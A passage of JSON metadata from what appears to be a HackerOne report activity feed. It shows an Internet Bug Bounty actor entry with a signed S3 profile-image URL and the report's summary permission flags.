0.276Z","actor":{"url":"/ibb","ibb":false,"profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7f78fcbd4901cebb25573e0ec350b7067d118156d58f1ca268af1270a71dc78e"},"profile":{"name":"Internet Bug Bounty"}},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}